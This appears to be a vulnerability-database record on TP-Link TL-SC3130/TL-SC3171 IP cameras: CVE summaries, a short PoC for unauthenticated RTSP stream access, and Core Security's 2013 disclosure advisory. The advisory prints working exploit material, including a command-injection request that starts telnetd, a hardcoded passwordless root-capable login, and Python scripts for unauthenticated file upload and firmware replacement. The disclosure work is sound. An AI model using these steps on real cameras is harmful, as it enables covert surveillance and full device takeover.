description: TP-Link TL-SC3130 1.6.18P12_121101 devices allow unauthenticated RTSP stream access, as demonstrated by a /jpg/image.jpg URI.
basic-info.cwe: Exposure of Sensitive Information to an Unauthorized Actor

description: cgi-bin/firmwareupgrade in TP-Link IP Cameras TL-SC3130, TL-SC3130G, TL-SC3171, TL-SC3171G, and possibly other models before beta firmware LM.1.6.18P12_sign6 allows remote attackers to modify the firmware revision via a "preset" action.

Unrestricted file upload vulnerability in cgi-bin/uploadfile in TP-Link IP Cameras TL-SC3130, TL-SC3130G, TL-SC3171, TL-SC3171G, and possibly other models before beta firmware LM.1.6.18P12_sign6, allows remote attackers to upload arbitrary files, then accessing it via a direct request to the file in the mnt/mtd directory.

TP-Link IP Cameras TL-SC3130, TL-SC3130G, TL-SC3171, TL-SC3171G, and possibly other models before beta firmware LM.1.6.18P12_sign6 have an empty password for the hardcoded "qmik" account, which allows remote attackers to obtain administrative access via a TELNET session.

cgi-bin/admin/servetest in TP-Link IP Cameras TL-SC3130, TL-SC3130G, TL-SC3171, TL-SC3171G, and possibly other models before beta firmware LM.1.6.18P12_sign6 allows remote attackers to execute arbitrary commands via shell metacharacters in (1) the ServerName parameter and (2) other unspecified parameters.
basic-info.cwe: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

description: The TP-Link IP Cameras TL-SC3171, TL-SC3130, TL-SC3130G, TL-SC3171G, and possibly other models before beta firmware LM.1.6.18P12_sign6, does not properly restrict access to certain administrative functions, which allows remote attackers to (1) cause a denial of service (device reboot) via a request to cgi-bin/reboot or (2) cause a denial of service (reboot and reset to factory defaults) via a request to cgi-bin/hardfactorydefault.

content:
"# Exploit Title: TP-Link TL-SC3130 1.6.18 - RTSP Stream Disclosure\\r\
# Author: Gjoko \'LiquidWorm\' Krstic @zeroscience\\r\
# Date: 2018-10-17\\r\
# Vendor: TP-LINK Technologies Co., Ltd.\\r\
# Product web page: http://www.tp-link.com\\r\
# Affected version: 1.6.18P12_121101\\r\
# Tested on: Boa/0.94.14rc21\\r\
# CVE: N/A\\r\
# References:\\r\
# Advisory ID: ZSL-2018-5497\\r\
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5497.php\\r\
\\r\
Desc: The TP-Link TL-SC3130 suffers from an unauthenticated and unauthorized\\r\
live RTSP stream disclosure.\\r\
\\r\
# PoC:\\r\
\\r\
http://TARGET/jpg/image.jpg\\r\
rtsp://TARGET:554/video.3gp"

27289.exploit-title: TP-Link TL-SC3171 IP Cameras - Multiple Vulnerabilities
content:
\'Core Security - Corelabs Advisory\\r\
http://corelabs.coresecurity.com/\\r\
\\r\
Multiple Vulnerabilities in TP-Link TL-SC3171 IP Cameras\\r\
\\r\
\\r\
1. *Advisory Information*\\r\
\\r\
Title: Multiple Vulnerabilities in TP-Link TL-SC3171 IP Cameras\\r\
Advisory ID: CORE-2013-0618\\r\
Advisory URL:\\r\
http://www.coresecurity.com/advisories/multiple-vulnerabilities-tp-link-tl-sc3171-ip-cameras\\r\
Date published: 2013-07-30\\r\
Date of last update: 2013-07-30\\r\
Vendors contacted: TP-Link\\r\
Release mode: Coordinated release\\r\
\\r\
\\r\
2. *Vulnerability Information*\\r\
\\r\
Class: OS command injection [CWE-78], Use of hard-coded credentials\\r\
[CWE-798], Authentication Bypass Issues [CWE-592], Missing\\r\
Authentication for Critical Function [CWE-306]\\r\
Impact: Code execution, Security bypass\\r\
Remotely Exploitable: Yes\\r\
Locally Exploitable: No\\r\
CVE Name: CVE-2013-2578, CVE-2013-2579, CVE-2013-2580, CVE-2013-2581\\r\
\\r\
\\r\
3. *Vulnerability Description*\\r\
\\r\
Multiple vulnerabilities have been found in TP-Link TL-SC3171 [1] IP\\r\
camera running firmware version LM.1.6.18P12_sign5 that could allow an\\r\
attacker:\\r\
\\r\
   1. [CVE-2013-2578] to execute arbitrary commands through the file\\r\
\\\'/cgi-bin/admin/servetest\\\'.\\r\
   2. [CVE-2013-2579] to execute arbitrary commands in a shell using\\r\
hard-coded credentials.\\r\
   3. [CVE-2013-2580] to perform unauthenticated remote file uploads.\\r\
   5. [CVE-2013-2581] to perform unauthenticated remote firmware upgrades.\\r\
\\r\
3.1. *Attack Paths*\\r\
\\r\
There are several attack paths that can be exploited by combining these\\r\
vulnerabilities with other ones discovered by Eliezer Varade Lopez,\\r\
Javier Repiso Sanchez and Jonas Ropero Castillo [2]. Additional attack\\r\
paths are available, but the ones listed here allow understanding how an\\r\
attacker could compromise the affected device.\\r\
\\r\
3.1.1. *Attack Path I*\\r\
\\r\
(Authentication: none)\\r\
\\r\
   1. Upload a rooted firmware exploiting [CVE-2013-2581].\\r\
   2. Reboot the device by exploiting \\\'http://<ip-cam>/cgi-bin/reboot\\\'[2].\\r\
\\r\
3.1.2. *Attack Path II*\\r\
\\r\
(Authentication: bypassed)\\r\
\\r\
   1. Reset the device to its factory defaults exploiting\\r\
\\\'http://<ip-cam>/cgi-bin/hardfactorydefault\\\'[2]. After this step, the\\r\
authentication can by bypassed by using \\\'admin:admin\\\' as a valid\\r\
\\\'username:password\\\'.\\r\
   2. Reboot the device by exploiting \\\'http://<ip-cam>/cgi-bin/reboot\\\'[2].\\r\
   3. Start the Telnet service exploiting [CVE-2013-2578].\\r\
   4. Login to the Telnet service using user \\\'qmik\\\' (no password)\\r\
[CVE-2013-2579], and use the device as a pivoting point.\\r\
\\r\
4. *Vulnerable Packages*\\r\
\\r\
Tests and PoC were run on:\\r\
\\r\
   . TP-Link TL-SC3171 IP camera running firmware version\\r\
LM.1.6.18P12_sign5.\\r\
   . Other TP-Link cameras and firmware versions are probably affected\\r\
too, but they were not checked.\\r\
\\r\
5. *Vendor Information, Solutions and Workarounds*\\r\
\\r\
Vendor provides the links to (pre-release) patched firmware versions\\r\
[3]. The final official versions will be released in the next few days.\\r\
Please, contact TP-Link for further information.\\r\
\\r\
6. *Credits*\\r\
\\r\
These vulnerabilities were discovered by Flavio de Cristofaro and\\r\
researched with the help of Andres Blanco from Core Security\\r\
Technologies. The publication of this advisory was coordinated by\\r\
Fernando Miranda from Core Advisories Team.\\r\
\\r\
\\r\
7. *Technical Description / Proof of Concept Code*\\r\
\\r\
7.1. *OS Command Injection in servetest*\\r\
\\r\
[CVE-2013-2578] The file \\\'/cgi-bin/admin/servetest\\\' has an OS command\\r\
injection in several of its parameters that can be exploited by an\\r\
authenticated user to execute arbitrary commands. The following proof of\\r\
concept starts the telnetd service:\\r\
\\r\
/-----\\r\
GET\\r\
/cgi-bin/admin/servetest?cmd=smtp&ServerName=1.1.1.1;/usr/sbin/telnetd;&ServerPort=25&ServerSSL=off&RcptToAddr1=q@q&AdminAddr=q@q\\r\
HTTP/1.1\\r\
Accept: */*\\r\
Accept-Language: en-us\\r\
Referer: http://192.168.1.100/progress.htm\\r\
If-Modified-Since: Sat, 1 Jan 2000 00:00:00 GMT\\r\
Accept-Encoding: gzip, deflate\\r\
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64;\\r\
Trident/5.0)\\r\
Host: 192.168.1.100\\r\
Proxy-Connection: Keep-Alive\\r\
Cookie: VideoFmt=1\\r\
Authorization: Basic YWRtaW46YWRtaW4=\\r\
Content-Length: 2\\r\
-----/\\r\
\\r\
7.2. *Hard-coded credentials in telnet service*\\r\
\\r\
[CVE-2013-2579] The affected system includes a hard-coded login with no\\r\
password which could be used by a remote attacker to access the OS of\\r\
the affected device using the built-in telnet service:\\r\
\\r\
/-----\\r\
username: qmik\\r\
password: (none)      \\r\
-----/\\r\
\\r\
The \\\'qmik\\\' user is allowed to execute the command \\\'su\\\', allowing the\\r\
user to execute arbitrary commands with root level privileges. The\\r\
telnet service can be enabled through [CVE-2013-2578].\\r\
\\r\
\\r\
7.3. *Unauthenticated remote file uploads*\\r\
\\r\
[CVE-2013-2580] The file \\\'/cgi-bin/uploadfile\\\' allows an unauthenticated\\r\
user to perform remote file uploads as shown in the following Python PoC:\\r\
\\r\
\\r\
/-----\\r\
import requests\\r\
\\r\
fileName = "lala.tmp"\\r\
f = open(fileName, "w")\\r\
f.write("lala")\\r\
f.close()\\r\
requests.post("http://192.168.1.100/cgi-bin/uploadfile",\\r\
files={fileName: open(fileName, "rb")})\\r\
-----/\\r\
\\r\
The uploaded file (in this example lala.tmp) will be hosted in the\\r\
\\\'/mnt/mtd\\\' directory.\\r\
\\r\
\\r\
7.4. *Unauthenticated remote firmware upgrades*\\r\
\\r\
[CVE-2013-2581] The file \\\'/cgi-bin/firmwareupgrade\\\' allows an\\r\
unauthenticated user to perform remote firmware upgrades as shown in the\\r\
following Python POC:\\r\
\\r\
\\r\
/-----\\r\
import requests\\r\
\\r\
requests.get("http://192.168.1.100/cgi-bin/firmwareupgrade?action=preset")\\r\
fileName = "COM_T01F001_LM.1.6.18P12_sign5_TPL.TL-SC3171.bin"\\r\
cookies={"VideoFmt":"1"}\\r\
requests.post("http://192.168.1.100/cgi-bin/firmwareupgrade?action=preset",\\r\
files={"SetFWFileName" : (fileName, open(fileName, "rb"))}, cookies=cookies)\\r\
-----/\\r\
\\r\
\\r\
8. *Report Timeline*\\r\
\\r\
. 2013-06-12:\\r\
Core Security Technologies notifies the TP-Link team of the vulnerability.\\r\
\\r\
. 2013-06-18:\\r\
Core Security Technologies notifies the TP-Link team of the\\r\
vulnerability and set the estimated publication date of the advisory for\\r\
July 10, 2013.\\r\
\\r\
. 2013-06-19:\\r\
TP-Link answers saying that these vulnerabilities are the same as the\\r\
ones published on May 28, 2013.\\r\
\\r\
. 2013-06-26:\\r\
Core Security Technologies notifies the TP-Link team that these are new,\\r\
different, vulnerabilities and sends a draft report with technical\\r\
information.\\r\
\\r\
. 2013-06-26:\\r\
Vendor acknowledges the receipt of the technical report.\\r\
\\r\
. 2013-07-01:\\r\
Vendor requests additional technical information.\\r\
\\r\
. 2013-07-04:\\r\
Core re-sends an improved technical report with additional information\\r\
regarding possible attack paths [Sec. 3.1].\\r\
\\r\
. 2013-07-10:\\r\
First release date missed.\\r\
\\r\
. 2013-07-15:\\r\
Core asks for a status update.\\r\
\\r\
. 2013-07-22:\\r\
Vendor notifies that a patched firmware version will be released on July\\r\
29th.\\r\
\\r\
. 2013-07-22:\\r\
Core re-schedules the advisory publication for July 29th.\\r\
\\r\
. 2013-07-26:\\r\
Vendor notifies that a (pre-release) patched firmware version is\\r\
available [3] and being tested. The final firmware version will be\\r\
released in the next few days.\\r\
\\r\
. 2013-07-30:\\r\
Advisory CORE-2013-0618 is published.\\r\
\\r\
\\r\
9. *References*\\r\
\\r\
[1] TP-Link TL-SC3171,\\r\
http://www.tp-link.com/en/products/details/?categoryid=230&model=TL-SC3171.\\r\
[2] Security Analysis of IP video surveillance cameras,\\r\
http://seclists.org/fulldisclosure/2013/Jun/84.\\r\
[3] See the online version,\\r\
http://www.coresecurity.com/advisories/multiple-vulnerabilities-tp-link-tl-sc3171-ip-cameras.\\r\
\\r\
\\r\
10. *About CoreLabs*\\r\
\\r\
CoreLabs, the research center of Core Security Technologies, is charged\\r\
with anticipating the future needs and requirements for information\\r\
security technologies. We conduct our research in several important\\r\
areas of computer security including system vulnerabilities, cyber\\r\
attack planning and simulation, source code auditing, and cryptography.\\r\
Our results include problem formalization, identification of\\r\
vulnerabilities, novel solutions and prototypes for new technologies.\\r\
CoreLabs regularly publishes security advisories, technical papers,\\r\
project information and shared software tools for public use at:\\r\
http://corelabs.coresecurity.com.\\r\
\\r\
\\r\
11. *About Core Security Technologies*\\r\
\\r\
Core Security Technologies enables organizations to get ahead of threats\\r\
with security test and measurement solutions that continuously identify\\r\
and demonstrate real-world exposures to their most critical assets. Our\\r\
customers can gain real visibility into their security standing, real\\r\
validation of their security controls, and real metrics to more\\r\
effectively secure their organizations.\\r\
\\r\
Core Security\\\'s software solutions build on over a decade of trusted\\r\
research and leading-edge threat expertise from the company\\\'s Security\\r\
Consulting Services, CoreLabs and Engineering groups. Core Security\\r\
Technologies can be reached at +1 (617) 399-6980 or on the Web at:\\r\
http://www.coresecurity.com.\\r\
\\r\
\\r\
12. *Disclaimer*\\r\
\\r\
The contents of this advisory are copyright (c) 2013 Core Security\\r\
Technologies and (c) 2013 CoreLabs, and are licensed under a Creative\\r\
Commons Attribution Non-Commercial Share-Alike 3.0 (United States)\\r\
License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/\\r\
\\r\
\\r\
13. *PGP/GPG Keys*\\r\
\\r\
This advisory has been signed with the GPG key of Core Security\\r\
Technologies advisories team, which is available for download at\\r\
http://www.coresecurity.com/files/attachments/core_security_advisories.asc.\
